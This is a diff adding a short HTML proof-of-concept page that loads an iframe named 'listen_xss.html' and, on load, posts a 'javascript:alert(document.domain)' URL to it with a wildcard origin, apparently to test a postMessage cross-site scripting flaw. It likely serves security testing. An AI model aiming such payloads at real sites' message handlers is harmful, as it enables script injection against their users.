@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+    <iframe name="test" src="listen_xss.html" onload="xss()"></iframe>
+</body>
+<script type="text/javascript">
+    var iframe = window.frames.test
+
+    function xss(){
+        let msg={"url":"javascript:alert(document.domain)"};
+        iframe.postMessage(msg,'*');
+    }
+</script>
+</html
